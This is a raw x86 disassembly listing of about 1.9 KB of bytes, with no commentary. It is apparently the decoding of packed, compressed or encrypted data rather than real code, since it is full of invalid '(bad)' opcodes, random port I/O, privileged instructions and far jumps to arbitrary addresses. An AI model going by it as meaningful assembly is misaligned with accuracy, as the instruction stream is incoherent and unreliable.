  40ba5a:	fucomip st,st(7)
  40ba5c:	lahf   
  40ba5d:	jmp    0x40bada
  40ba5f:	mov    esi,0x80466c75
  40ba64:	adc    edx,DWORD PTR [ebp+0x29]
  40ba67:	add    ch,al
  40ba69:	push   edi
  40ba6a:	and    BYTE PTR [eax+eax*2+0x79],bl
  40ba6e:	std    
  40ba6f:	xchg   ebp,eax
  40ba70:	and    BYTE PTR [esi],cl
  40ba72:	mov    ds:0x476bf8ee,eax
  40ba77:	push   edi
  40ba78:	jno    0x40ba00
  40ba7a:	xchg   ecx,eax
  40ba7b:	mov    WORD PTR [esp+ecx*2],gs
  40ba7e:	sbb    eax,0x4b31dae7
  40ba83:	xchg   edi,eax
  40ba84:	cmp    edx,DWORD PTR [edx]
  40ba86:	cmp    edx,DWORD PTR [ecx+ebx*8]
  40ba89:	mov    ecx,DWORD PTR [ecx+0x1e5bfdc4]
  40ba8f:	or     ecx,ebx
  40ba91:	scas   al,BYTE PTR es:[edi]
  40ba92:	mov    esi,0xf3fe3d3c
  40ba97:	out    dx,eax
  40ba98:	imul   edx,ebx,0xdb4432ff
  40ba9e:	add    cl,BYTE PTR [ebx]
  40baa0:	addr16 push 0xeaaf926a
  40baa6:	pop    eax
  40baa7:	sar    esi,cl
  40baa9:	sti    
  40baaa:	xor    al,0x83
  40baac:	mov    cl,0xd3
  40baae:	xor    ebp,DWORD PTR [edi+0x4d]
  40bab1:	in     eax,0x91
  40bab3:	call   0xe4a6f7ae
  40bab8:	dec    ebp
  40bab9:	loopne 0x40bb33
  40babb:	int    0x22
  40babd:	mov    edi,0x9b55a996
  40bac2:	in     eax,0x2c
  40bac4:	sbb    cl,bh
  40bac6:	inc    esi
  40bac7:	mov    dl,0xd0
  40bac9:	jb     0x40badd
  40bacb:	add    DWORD PTR [edi+0x5226dc4a],edi
  40bad1:	xor    eax,0x1defe13
  40bad6:	pop    edi
  40bad7:	jle    0x40bb1d
  40bad9:	aas    
  40bada:	xor    eax,0x58277f02
  40badf:	pusha  
  40bae0:	loop   0x40bb4e
  40bae2:	ficom  WORD PTR [ecx+0x8]
  40bae5:	inc    eax
  40bae6:	out    dx,al
  40bae7:	jg     0x40bb4d
  40bae9:	retf   0x7074
  40baec:	lock add edi,esp
  40baef:	and    BYTE PTR [edx-0x37],dl
  40baf2:	inc    ecx
  40baf3:	imul   ebp,DWORD PTR ds:0x82e21c7e,0x34c1353d
  40bafd:	or     ebx,ebp
  40baff:	mov    WORD PTR [esp+ecx*8+0x3d],ss
  40bb03:	sbb    dh,cl
  40bb05:	(bad)  
  40bb06:	cmp    ebx,DWORD PTR [edx+0x6b8411a9]
  40bb0c:	mov    eax,ds:0x4d04eca8
  40bb11:	jmp    0x821ecf40
  40bb16:	xor    BYTE PTR [ebx],0x23
  40bb19:	repz ror BYTE PTR [ebp-0x69],0x34
  40bb1e:	cmp    ah,BYTE PTR [edi+0x23960eb9]
  40bb24:	fwait
  40bb25:	xor    ebp,edx
  40bb27:	jle    0x40bb29
  40bb29:	xor    DWORD PTR [ebx-0x7f],ebp
  40bb2c:	cmp    esp,DWORD PTR [edi+0x3e390f19]
  40bb32:	mov    BYTE PTR [esi-0x4],bh
  40bb35:	out    0xf0,al
  40bb37:	and    cl,BYTE PTR [esi-0x2f]
  40bb3a:	loop   0x40baf1
  40bb3c:	test   ecx,ebx
  40bb3e:	xchg   ebx,eax
  40bb3f:	loope  0x40bba7
  40bb41:	(bad)  
  40bb43:	test   eax,0xb0b7d2fd
  40bb48:	mov    ebp,0x2de62909
  40bb4d:	das    
  40bb4e:	sub    BYTE PTR [edi+0x68],al
  40bb51:	pusha  
  40bb52:	sbb    DWORD PTR [ebx],ecx
  40bb54:	rol    BYTE PTR [eax+0x7b79e321],0x68
  40bb5b:	jl     0x40bbce
  40bb5d:	or     eax,0xb96bbbea
  40bb62:	adc    BYTE PTR [edx+0x6b191f80],bh
  40bb68:	(bad)  
  40bb69:	nop
  40bb6a:	mov    ebp,?
  40bb6c:	mov    BYTE PTR [ecx+edi*1+0x67],ah
  40bb70:	out    0xc0,eax
  40bb72:	mov    bh,0x81
  40bb74:	hlt    
  40bb75:	xlat   BYTE PTR es:[ebx]
  40bb77:	jns    0x40bb8b
  40bb79:	cmp    esp,DWORD PTR [eax+0x61db20fd]
  40bb7f:	pushf  
  40bb80:	add    eax,0x64b02ef3
  40bb85:	psadbw mm0,QWORD PTR gs:[eax+0x3ca42db0]
  40bb8d:	dec    ebp
  40bb8e:	jg     0x40bbbb
  40bb90:	lock xchg ebx,eax
  40bb92:	mov    cl,0x54
  40bb94:	sub    BYTE PTR [ecx+0x6],al
  40bb97:	jmp    0x32797bc
  40bb9c:	inc    ebp
  40bb9d:	addr16 cmc 
  40bb9f:	js     0x40bbfc
  40bba1:	out    0x2a,al
  40bba3:	loopne 0x40bc10
  40bba5:	mov    eax,0x68e201d3
  40bbaa:	and    eax,0xcc893aa8
  40bbaf:	sub    eax,DWORD PTR [esi+0x6f]
  40bbb2:	inc    edi
  40bbb3:	lds    edi,FWORD PTR [edi+0x24]
  40bbb6:	sub    BYTE PTR [edx+0x769da3c],ch
  40bbbc:	mov    edi,0xa5cec361
  40bbc1:	imul   ecx,DWORD PTR [ecx-0x3d],0x2f
  40bbc5:	sahf   
  40bbc6:	cmp    edx,esp
  40bbc8:	push   0x6d
  40bbca:	xor    DWORD PTR [ebx],0x33
  40bbcd:	mov    ds:0x6137828c,al
  40bbd2:	push   0xfffffffc
  40bbd4:	fild   DWORD PTR [ecx]
  40bbd6:	inc    edx
  40bbd7:	mov    bh,0xcf
  40bbd9:	out    dx,eax
  40bbda:	(bad)  
  40bbdb:	test   BYTE PTR [ebx+esi*2+0x0],0xed
  40bbe0:	icebp  
  40bbe1:	add    cl,BYTE PTR [edx-0x74b9e090]
  40bbe7:	sub    al,0xf1
  40bbe9:	mov    ebp,0x3549c725
  40bbee:	mov    dh,0x9f
  40bbf0:	xchg   esp,eax
  40bbf1:	lds    esi,FWORD PTR [ecx+ebx*8-0x2e1793]
  40bbf8:	mov    ebx,0x587ed85a
  40bbfd:	hlt    
  40bbfe:	pop    ss
  40bbff:	lock mov edx,0xa7f4a6a2
  40bc05:	aam    0x55
  40bc07:	jae    0x40bc29
  40bc09:	push   ebp
  40bc0a:	pusha  
  40bc0b:	fidivr WORD PTR [ecx+0x22]
  40bc0e:	mov    ecx,0x3cda54f2
  40bc13:	sbb    edi,DWORD PTR [ecx]
  40bc15:	sbb    eax,0xbe95f48d
  40bc1a:	push   0x77
  40bc1c:	push   es
  40bc1d:	dec    esi
  40bc1e:	cmp    edi,ebx
  40bc20:	push   es
  40bc21:	addr16 (bad) 
  40bc23:	shl    BYTE PTR [edx],0x57
  40bc26:	sbb    BYTE PTR [ecx],dl
  40bc28:	mov    ds:0xbd3e3e53,eax
  40bc2d:	or     eax,0x43188755
  40bc32:	and    DWORD PTR [ebx],ecx
  40bc34:	mov    edi,0xbadbf7af
  40bc39:	das    
  40bc3a:	shr    DWORD PTR [edx+0x4fec0df],0x10
  40bc41:	ins    BYTE PTR es:[edi],dx
  40bc42:	jge    0x40bc9f
  40bc44:	imul   esi,DWORD PTR [ebp-0x5ab22119],0xffffffb8
  40bc4b:	push   0x22
  40bc4d:	out    0x30,al
  40bc4f:	lahf   
  40bc50:	push   ebx
  40bc51:	leave  
  40bc52:	sbb    BYTE PTR [edi+0x37e3a13d],ch
  40bc58:	int3   
  40bc59:	fld    DWORD PTR [ecx+0x25]
  40bc5c:	or     dh,al
  40bc5e:	imul   eax,DWORD PTR [edx+0x6d],0x84f3473f
  40bc65:	neg    BYTE PTR [ecx-0x3e0e705f]
  40bc6b:	sbb    ebp,DWORD PTR [ebx+0x71]
  40bc6e:	adc    ecx,DWORD PTR [ebx-0x1beef04b]
  40bc74:	cmp    al,0x89
  40bc76:	pushf  
  40bc77:	aam    0x19
  40bc79:	aas    
  40bc7a:	data16 mov ah,0x5a
  40bc7d:	jg     0x40bc9d
  40bc7f:	pop    ebp
  40bc80:	movhps xmm6,QWORD PTR [edx-0x20]
  40bc84:	mov    dl,0xf1
  40bc86:	mov    ecx,eax
  40bc88:	dec    esi
  40bc89:	push   eax
  40bc8a:	dec    ecx
  40bc8b:	adc    edi,DWORD PTR [esi+0x2eb96206]
  40bc91:	dec    ecx
  40bc92:	(bad)  
  40bc93:	call   0x91bb:0xadb914d1
  40bc9a:	xor    edi,DWORD PTR [eax-0x61]
  40bc9d:	rcl    BYTE PTR [esi+0x38fa0f90],1
  40bca3:	jecxz  0x40bca1
  40bca5:	jbe    0x40bc92
  40bca7:	not    BYTE PTR [eax+ecx*2-0x32f24ec8]
  40bcae:	cmp    bh,BYTE PTR [edx+ebx*4]
  40bcb1:	jecxz  0x40bce6
  40bcb3:	or     ah,BYTE PTR [esi+0x5ce515f6]
  40bcb9:	push   0x9d98ab18
  40bcbe:	sub    cl,bh
  40bcc0:	bound  eax,QWORD PTR [ecx+0x356114c6]
  40bcc6:	(bad)  
  40bcc7:	fist   DWORD PTR [eax+0x6763e26c]
  40bccd:	gs std 
  40bccf:	loopne 0x40bcac
  40bcd1:	mov    BYTE PTR [ecx],al
  40bcd3:	mov    ds:0xc90d9d,al
  40bcd8:	shr    BYTE PTR [edx],1
  40bcda:	clc    
  40bcdb:	or     DWORD PTR [ebx+ebp*4+0x37],0xfffffffd
  40bce0:	add    eax,0xb4ee0e33
  40bce5:	jne    0x40bcbe
  40bce7:	mov    ebx,0x20a7b445
  40bcec:	ret    0xee39
  40bcef:	out    dx,eax
  40bcf0:	mov    edi,0xedcd74cd
  40bcf5:	lds    ebx,FWORD PTR [eax-0x7e]
  40bcf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcf9:	add    ecx,DWORD PTR [ebx-0x4c2e2190]
  40bcff:	mov    ds:0x4c2562f9,al
  40bd04:	sub    DWORD PTR [edx-0x6a5e57a],edi
  40bd0a:	jbe    0x40bcff
  40bd0c:	outs   dx,BYTE PTR ds:[esi]
  40bd0d:	sub    ah,BYTE PTR [ebp+0x192cbc23]
  40bd13:	fcmovb st,st(5)
  40bd15:	call   0x1a4c:0x17550449
  40bd1c:	ins    DWORD PTR es:[edi],dx
  40bd1d:	add    eax,0xfa761c1e
  40bd22:	(bad)  
  40bd23:	ds inc ecx
  40bd25:	sub    ecx,edi
  40bd27:	sub    ah,al
  40bd29:	fld    TBYTE PTR [ebp-0x3c]
  40bd2c:	cld    
  40bd2d:	push   0x17
  40bd2f:	or     BYTE PTR [ebx-0x1ddb29d1],0xc9
  40bd36:	cmc    
  40bd37:	popf   
  40bd38:	or     bh,cl
  40bd3a:	sbb    esi,DWORD PTR [ecx]
  40bd3c:	fstp   DWORD PTR [eax-0x1f]
  40bd3f:	int3   
  40bd40:	ss fs xchg esp,eax
  40bd43:	(bad)  
  40bd44:	pop    edx
  40bd45:	xchg   ebx,eax
  40bd46:	sahf   
  40bd47:	push   ebp
  40bd48:	pop    esi
  40bd49:	mov    eax,0x9f495193
  40bd4e:	shr    DWORD PTR [edi+ebp*2],1
  40bd51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd52:	or     eax,0x783d60de
  40bd57:	xchg   DWORD PTR [edi+0x475b13ce],eax
  40bd5d:	leave  
  40bd5e:	(bad)  
  40bd5f:	mov    bl,BYTE PTR [esi]
  40bd61:	xchg   ebp,eax
  40bd62:	loop   0x40bd5b
  40bd64:	or     edi,DWORD PTR [ebx+ebp*2+0x43]
  40bd68:	loop   0x40bd79
  40bd6a:	std    
  40bd6b:	or     cl,BYTE PTR [edx+0x4f27aa77]
  40bd71:	hlt    
  40bd72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd73:	outs   dx,DWORD PTR ds:[esi]
  40bd74:	arpl   dx,si
  40bd76:	nop
  40bd77:	dec    edx
  40bd78:	es stc 
  40bd7a:	cs ja  0x40bd23
  40bd7d:	push   0xffffffa8
  40bd7f:	dec    ah
  40bd81:	or     DWORD PTR [ecx],eax
  40bd83:	outs   dx,BYTE PTR ds:[esi]
  40bd84:	pop    ebx
  40bd85:	and    BYTE PTR [ebx+esi*2-0x7d955f85],0x31
  40bd8d:	lods   al,BYTE PTR ds:[esi]
  40bd8e:	lock outs dx,DWORD PTR ds:[esi]
  40bd90:	(bad)  
  40bd91:	jnp    0x40bda6
  40bd93:	mov    ds:0xd2072e69,eax
  40bd98:	test   al,0x3d
  40bd9a:	lods   eax,DWORD PTR ds:[esi]
  40bd9b:	fisubr DWORD PTR [ebx+0x43]
  40bd9e:	cmp    eax,0xbac43852
  40bda3:	push   cs
  40bda4:	jbe    0x40bd52
  40bda6:	int    0xa0
  40bda8:	push   ecx
  40bda9:	jae    0x40be03
  40bdab:	xchg   edx,eax
  40bdac:	or     eax,0xa5d4dd9c
  40bdb1:	ins    BYTE PTR es:[edi],dx
  40bdb2:	sar    ah,0x94
  40bdb5:	call   0xd7dbb22e
  40bdba:	stc    
  40bdbb:	retf   0x19c9
  40bdbe:	loope  0x40bdf1
  40bdc0:	fld    QWORD PTR [esi-0x73]
  40bdc3:	jnp    0x40bd61
  40bdc5:	in     eax,dx
  40bdc6:	jne    0x40be2e
  40bdc8:	mov    ecx,0x2da9be41
  40bdcd:	dec    ebp
  40bdce:	sar    BYTE PTR [ebx-0x31177168],cl
  40bdd4:	mov    ebp,0x887b1712
  40bdd9:	pop    ds
  40bdda:	jl     0x40bdba
  40bddc:	pushf  
  40bddd:	jmp    0xd01fb60c
  40bde2:	call   0x76230453
  40bde7:	(bad)  
  40bde8:	xchg   ebp,eax
  40bde9:	stc    
  40bdea:	fimul  WORD PTR [edx-0x4e5531ef]
  40bdf0:	inc    edx
  40bdf1:	mov    esi,0x1612a640
  40bdf6:	jmp    0x983:0xd9d41966
  40bdfd:	repnz out 0x88,al
  40be00:	cmc    
  40be01:	push   0x9671ea3a
  40be06:	xor    al,0x1f
  40be08:	pop    ebp
  40be09:	or     edi,0x65ca8583
  40be0f:	jp     0x40bdfb
  40be11:	adc    edx,eax
  40be13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be14:	mov    dh,0x91
  40be16:	mov    ecx,0xb814cd45
  40be1b:	sbb    esi,ebx
  40be1d:	push   eax
  40be1e:	jmp    0x37f2:0x1dfa8578
  40be25:	sar    BYTE PTR [ebp-0x75],0xf6
  40be29:	in     eax,0x63
  40be2b:	repz in eax,0x4e
  40be2e:	fcomp  DWORD PTR [edi-0x39]
  40be31:	mov    dh,0x29
  40be33:	fwait
  40be34:	pop    esi
  40be35:	out    0xaf,al
  40be37:	scas   eax,DWORD PTR es:[edi]
  40be38:	mov    tr7,ebx
  40be3b:	mov    ds:0xf48c118b,eax
  40be40:	jmp    0x67d0:0x9f9d0c5d
  40be47:	pop    esi
  40be48:	fadd   DWORD PTR [esi]
  40be4a:	sbb    ah,BYTE PTR [ecx-0x3082bd5d]
  40be50:	xchg   esi,eax
  40be51:	xlat   BYTE PTR ds:[ebx]
  40be52:	fs imul ebx,esp,0xffffffd9
  40be56:	and    esp,ebp
  40be58:	test   al,0xd4
  40be5a:	mov    esi,0x40fc9692
  40be5f:	sbb    BYTE PTR [eax+edx*2+0x7a0675d7],0x2b
  40be67:	mov    ebp,0xc9e4ad50
  40be6c:	jmp    0x40bec6
  40be6e:	sub    DWORD PTR [ecx],eax
  40be70:	pop    ds
  40be71:	jecxz  0x40bee6
  40be73:	addr16 cmc 
  40be75:	rol    BYTE PTR [edx-0x5a],cl
  40be78:	push   eax
  40be79:	hlt    
  40be7a:	xchg   edi,eax
  40be7b:	inc    ebx
  40be7c:	scas   al,BYTE PTR es:[edi]
  40be7d:	imul   ebx,DWORD PTR [eax-0x73],0x4a
  40be81:	scas   al,BYTE PTR es:[edi]
  40be82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be83:	fisttp QWORD PTR ds:0x54afaf6c
  40be89:	and    esi,ebx
  40be8b:	mov    eax,ds:0x1ecc7b46
  40be90:	data16 jge 0x40be44
  40be93:	inc    esp
  40be94:	int    0x8f
  40be96:	lds    ebx,FWORD PTR [ecx+0x34]
  40be99:	mov    ds:0x28949d83,al
  40be9e:	lods   al,BYTE PTR ds:[esi]
  40be9f:	push   edi
  40bea0:	jb     0x40be3f
  40bea2:	test   DWORD PTR ds:0xebb6f99d,ebx
  40bea8:	fist   DWORD PTR [eax]
  40beaa:	add    al,0xcb
  40beac:	dec    eax
  40bead:	in     eax,dx
  40beae:	dec    edi
  40beaf:	xchg   esi,eax
  40beb0:	stc    
  40beb1:	cli    
  40beb2:	jno    0x40bf1d
  40beb4:	je     0x40bf20
  40beb6:	cdq    
  40beb7:	mov    ebx,0x8a43a2e4
  40bebc:	(bad)  [ebp+0x1d]
  40bebf:	push   cs
  40bec0:	std    
  40bec1:	adc    eax,0x1e3b956b
  40bec6:	xor    cl,ah
  40bec8:	rol    ecx,0x58
  40becb:	icebp  
  40becc:	xor    eax,0x7e7ebbf7
  40bed1:	sub    eax,DWORD PTR [eax+0x65]
  40bed4:	push   edi
  40bed5:	mov    ecx,0x16742446
  40beda:	lds    eax,FWORD PTR [edi+0x3b]
  40bedd:	cwde   
  40bede:	mov    ?,WORD PTR [eax+ebp*2]
  40bee1:	daa    
  40bee2:	push   edx
  40bee3:	shl    DWORD PTR [ebp-0x6e],cl
  40bee6:	jnp    0x40be89
  40bee8:	pop    eax
  40bee9:	add    al,0xa6
  40beeb:	(bad)  
  40beec:	nop
  40beed:	(bad)  
  40beee:	xor    BYTE PTR [edi],dl
  40bef0:	inc    eax
  40bef1:	mov    ah,dh
  40bef3:	fcmovnbe st,st(1)
  40bef5:	adc    DWORD PTR [esi+0x1c465a61],esi
  40befb:	xchg   ecx,eax
  40befc:	retf   0x8388
  40beff:	add    ebp,DWORD PTR [edx-0x53]
  40bf02:	scas   eax,DWORD PTR es:[edi]
  40bf03:	imul   ebp,edi,0x747df4b0
  40bf09:	ret    
  40bf0a:	xor    al,0xd
  40bf0c:	mov    BYTE PTR [eax+edi*1+0x7b0aa1a7],cl
  40bf13:	lock pop ds
  40bf15:	mov    ebx,db5
  40bf18:	jnp    0x40becd
  40bf1a:	in     al,0xaa
  40bf1c:	mov    bl,0x6e
  40bf1e:	mov    dl,0xb7
  40bf20:	sub    eax,0xe61ddd81
  40bf25:	and    al,0x38
  40bf27:	xchg   ecx,eax
  40bf28:	jnp    0x40bf27
  40bf2a:	outs   dx,DWORD PTR ds:[esi]
  40bf2b:	gs pusha 
  40bf2d:	icebp  
  40bf2e:	sub    bl,cl
  40bf30:	nop
  40bf31:	push   ss
  40bf32:	push   ebx
  40bf33:	loopne 0x40bf1a
  40bf35:	xor    BYTE PTR [ebx+0x53f218e1],0xb5
  40bf3c:	in     al,dx
  40bf3d:	dec    esp
  40bf3e:	dec    esp
  40bf3f:	xchg   ebp,eax
  40bf40:	xor    eax,0x64b72275
  40bf45:	call   0xddae:0xd3752dba
  40bf4c:	and    al,0xbe
  40bf4e:	dec    eax
  40bf4f:	addps  xmm2,xmm2
  40bf52:	icebp  
  40bf53:	rcl    BYTE PTR [eax+0x4805b06e],1
  40bf59:	ret    0xfde7
  40bf5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf5d:	cmp    BYTE PTR [ecx-0x36],0x6a
  40bf61:	add    ecx,eax
  40bf63:	xchg   ebp,eax
  40bf64:	jp     0x40bef5
  40bf66:	or     BYTE PTR [ecx+0x34],dl
  40bf69:	aas    
  40bf6a:	fidivr WORD PTR [eax-0x14]
  40bf6d:	pop    esi
  40bf6e:	sbb    al,0x59
  40bf70:	sbb    dl,BYTE PTR [edx]
  40bf72:	push   cs
  40bf73:	push   edx
  40bf74:	outs   dx,BYTE PTR ds:[esi]
  40bf75:	mov    ebx,0x922a816f
  40bf7a:	stc    
  40bf7b:	jmp    0x40bf5d
  40bf7d:	mov    edi,0x49bb6c06
  40bf82:	out    0x65,al
  40bf84:	push   0xccce5908
  40bf89:	outs   dx,DWORD PTR ds:[esi]
  40bf8a:	icebp  
  40bf8b:	mov    al,0x73
  40bf8d:	shl    BYTE PTR [eax-0x2d],cl
  40bf90:	inc    edx
  40bf91:	xchg   ebp,eax
  40bf92:	jae    0x40bfaa
  40bf94:	adc    al,0x8c
  40bf96:	sbb    BYTE PTR [ecx-0x2f],ch
  40bf99:	push   ds
  40bf9a:	retf   0xc04c
  40bf9d:	sar    DWORD PTR [edx-0x21af2d45],cl
  40bfa3:	xchg   edi,eax
  40bfa4:	fsubr  DWORD PTR [edx-0x5f54a9ab]
  40bfaa:	test   al,0x8c
  40bfac:	(bad)  
  40bfad:	out    0x55,al
  40bfaf:	adc    eax,0x41a734b6
  40bfb4:	push   ss
  40bfb5:	cmp    cl,BYTE PTR [esi+ebp*1-0x57301481]
  40bfbc:	jg     0x40bfac
  40bfbe:	jae    0x40bf66
  40bfc0:	push   0xffffffe4
  40bfc2:	enter  0x1d98,0xb0
  40bfc6:	cmp    al,0xed
  40bfc8:	shl    DWORD PTR [ecx-0x70],0xa8
  40bfcc:	dec    ebx
  40bfcd:	clc    
  40bfce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfcf:	or     DWORD PTR [edi+edx*2+0x7d],ebx
  40bfd3:	and    al,0x8e
  40bfd5:	retf   
  40bfd6:	mov    cl,0xd
  40bfd8:	repnz loopne 0x40bfb3
  40bfdb:	xlat   BYTE PTR ds:[ebx]
  40bfdc:	and    bl,BYTE PTR [eax+edi*8]
  40bfdf:	xchg   edi,eax
  40bfe0:	gs mov ch,0xcd
  40bfe3:	pop    esi
  40bfe4:	add    al,0xda
  40bfe6:	bound  esi,QWORD PTR [esi+0x1d820b1c]
  40bfec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfed:	and    eax,0x7fbf7b81
  40bff2:	jb     0x40c017
  40bff4:	and    ebx,DWORD PTR [ecx-0x176b1d0c]
  40bffa:	sub    ecx,ebp
  40bffc:	xchg   ebx,eax
  40bffd:	push   ebx
  40bffe:	in     eax,0xe6
  40c000:	dec    esp
  40c001:	lea    ecx,[edx+0x4f]
  40c004:	iret   
  40c005:	mov    ds:0x32aecb1c,eax
  40c00a:	add    DWORD PTR [edx+0x5819bef6],ebp
  40c010:	mov    bl,0xd2
  40c012:	mov    bl,0xc7
  40c014:	xor    al,0x9f
  40c016:	sahf   
  40c017:	dec    edi
  40c018:	pop    ss
  40c019:	sahf   
  40c01a:	add    DWORD PTR [esp+eiz*8],eax
  40c01d:	icebp  
  40c01e:	cmp    bl,BYTE PTR [ebx+0x21]
  40c021:	or     al,0xe0
  40c023:	test   DWORD PTR [ecx-0x28],ebx
  40c026:	into   
  40c027:	xchg   esi,eax
  40c028:	(bad)  
  40c029:	cmp    al,0xc4
  40c02b:	jo     0x40c023
  40c02d:	inc    ebp
  40c02e:	daa    
  40c02f:	jne    0x40bfeb
  40c031:	in     al,dx
  40c032:	mov    eax,0xa7124bdd
  40c037:	jmp    0x40c08b
  40c039:	shl    DWORD PTR [esi+0x41c73d12],0x70
  40c040:	scas   al,BYTE PTR es:[edi]
  40c041:	inc    edx
  40c042:	aaa    
  40c043:	sub    dl,al
  40c045:	aaa    
  40c046:	cmp    al,0x5b
  40c048:	xor    al,0x4
  40c04a:	sbb    DWORD PTR [edx+0x79],edx
  40c04d:	(bad)  
  40c04e:	inc    BYTE PTR [ecx]
  40c050:	pop    es
  40c051:	xchg   BYTE PTR [ecx+eax*8],dh
  40c054:	int    0x3a
  40c056:	shl    DWORD PTR [ecx-0x5b6f75ea],1
  40c05c:	lds    ecx,FWORD PTR [ecx+ebx*4+0x21a88f33]
  40c063:	and    edx,edi
  40c065:	xor    edx,edx
  40c067:	push   0xffffffbe
  40c069:	hlt    
  40c06a:	gs push edx
  40c06c:	xor    edx,eax
  40c06e:	jnp    0x40c096
  40c070:	fs mov eax,0x7ca44bfa
  40c076:	adc    bh,BYTE PTR [ebx+eax*1]
  40c079:	icebp  
  40c07a:	push   edi
  40c07b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c07c:	mov    esp,0x25a872f0
  40c081:	hlt    
  40c082:	jns    0x40c0e2
  40c084:	call   0xf617:0xd7949e7f
  40c08b:	out    dx,eax
  40c08c:	lahf   
  40c08d:	into   
  40c08e:	sbb    ebx,DWORD PTR [ecx+0x6fb39867]
  40c094:	sub    eax,0x4c018966
  40c099:	inc    ebp
  40c09a:	xor    eax,0x4f11b2d6
  40c09f:	addr16 ret 
  40c0a1:	jmp    0x40c0af
  40c0a3:	in     eax,0xe9
  40c0a5:	les    ecx,FWORD PTR [ebx]
  40c0a7:	pop    ecx
  40c0a8:	sbb    eax,0x5bc34cc3
  40c0ad:	push   esp
  40c0ae:	mov    DWORD PTR [edi+edi*8-0xa],ebx
  40c0b2:	das    
  40c0b3:	arpl   WORD PTR [edi+0x38cb58e0],sp
  40c0b9:	fild   WORD PTR [ebx]
  40c0bb:	lds    edi,FWORD PTR [edx]
  40c0bd:	push   ebx
  40c0be:	rcl    BYTE PTR [ebp-0x31],cl
  40c0c1:	dec    eax
  40c0c2:	and    bh,ah
  40c0c4:	sub    dl,BYTE PTR [eax]
  40c0c6:	mov    dl,0x7d
  40c0c8:	cmp    ebp,DWORD PTR [edx]
  40c0ca:	pop    ebp
  40c0cb:	cmp    ebp,DWORD PTR fs:[edi-0x14]
  40c0cf:	and    BYTE PTR [ebx],bl
  40c0d1:	or     ah,BYTE PTR [ecx-0x31]
  40c0d4:	fist   WORD PTR ds:0x5727414d
  40c0da:	add    DWORD PTR [ecx],eax
  40c0dc:	inc    edx
  40c0dd:	push   ebx
  40c0de:	arpl   bx,ax
  40c0e0:	adc    al,0x75
  40c0e2:	and    ebx,DWORD PTR [eax+0x10]
  40c0e5:	add    al,0x56
  40c0e7:	(bad)  
  40c0e8:	not    BYTE PTR [edx+esi*8]
  40c0eb:	(bad)  
  40c0ed:	pop    ebx
  40c0ee:	test   dh,al
  40c0f0:	in     al,dx
  40c0f1:	cli    
  40c0f2:	pop    edx
  40c0f3:	rcl    BYTE PTR [edi],0x52
  40c0f6:	mov    esp,0x22459fd9
  40c0fb:	mov    ch,0x2
  40c0fd:	jmp    0xc00b:0x8e3467fd
  40c104:	xlat   BYTE PTR ds:[ebx]
  40c105:	(bad)  
  40c106:	push   ebp
  40c107:	mov    gs,ebp
  40c109:	or     al,0xe
  40c10b:	lods   eax,DWORD PTR ds:[esi]
  40c10c:	inc    ebx
  40c10d:	cmp    BYTE PTR [edi+0x2a],cl
  40c110:	sbb    al,0xcc
  40c112:	cmp    BYTE PTR [edx+eax*8],bh
  40c115:	ins    DWORD PTR es:[edi],dx
  40c116:	mov    cl,0x1d
  40c118:	(bad)  
  40c119:	jbe    0x40c0d7
  40c11b:	rcr    BYTE PTR [edx-0x4e],cl
  40c11e:	cmp    DWORD PTR [ecx],ecx
  40c120:	adc    eax,0x350951ab
  40c125:	inc    edi
  40c126:	idiv   esp
  40c128:	clc    
  40c129:	popf   
  40c12a:	inc    ecx
  40c12b:	sbb    BYTE PTR [ecx+0x6ac3bbfe],0x35
  40c132:	dec    ecx
  40c133:	ins    BYTE PTR es:[edi],dx
  40c134:	test   al,0xe1
  40c136:	add    esi,edi
  40c138:	jmp    0x40c185
  40c13a:	loop   0x40c146
  40c13c:	add    eax,0xb8fd9b14
  40c141:	addr16 into 
  40c143:	adc    DWORD PTR [ebp+0x1c],0xffffff85
  40c147:	hlt    
  40c148:	xor    al,0x4c
  40c14a:	repnz or BYTE PTR [ebp-0x1c],bl
  40c14e:	lods   eax,DWORD PTR ds:[esi]
  40c14f:	fimul  WORD PTR [eax]
  40c151:	rol    DWORD PTR [ebx-0x7c],0xa2
  40c155:	(bad)  
  40c156:	loop   0x40c1c7
  40c158:	sbb    al,0xd4
  40c15a:	mov    ch,0x8c
  40c15c:	mov    dh,0xd9
  40c15e:	push   esp
  40c15f:	loopne 0x40c1db
  40c161:	or     cl,al
  40c163:	enter  0xf648,0xb1
  40c167:	jmp    0xea67:0x361ba6fc
  40c16e:	jl     0x40c0fc
  40c170:	(bad)  
  40c171:	lahf   
  40c172:	adc    dh,ch
  40c174:	call   0x26bd:0xf69ea34e
  40c17b:	fiadd  DWORD PTR [ebp+edi*4-0x3e]
  40c17f:	jle    0x40c1a9
  40c181:	aad    0x81
  40c183:	inc    edi
  40c184:	daa    
  40c185:	arpl   WORD PTR [ebp+0x1b],si
  40c188:	mov    al,ds:0xb390685e
  40c18d:	mov    edi,DWORD PTR [eax+0x70]
  40c190:	popf   
  40c191:	adc    al,0x28
  40c193:	adc    dl,bl
  40c195:	(bad)  
  40c196:	push   0x159b223c
  40c19b:	sbb    eax,0x87ae2e57
  40c1a0:	or     al,0x32
  40c1a2:	and    ch,BYTE PTR [ebx-0x89c314d]
  40c1a8:	add    esi,ecx
  40c1aa:	push   edi
  40c1ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1ac:	je     0x40c207
  40c1ae:	stos   BYTE PTR es:[edi],al
  40c1af:	mov    eax,0x32525
  40c1b4:	fnstsw WORD PTR [edx]
  40c1b6:	imul   ebx,DWORD PTR [eax],0x46
  40c1b9:	ins    BYTE PTR es:[edi],dx
  40c1ba:	call   DWORD PTR [ebp-0x57e099c6]
  40c1c0:	daa    
  40c1c1:	bound  edx,QWORD PTR [ecx+ebx*1+0x1d15c680]
  40c1c8:	and    DWORD PTR [ecx+0x17fdf596],ebp
  40c1ce:	repz out 0xb0,al
  40c1d1:	out    0x9a,al
  40c1d3:	jp     0x40c1cb
  40c1d5:	aam    0x6d
  40c1d7:	add    al,0x54
  40c1d9:	jge    0x40c258
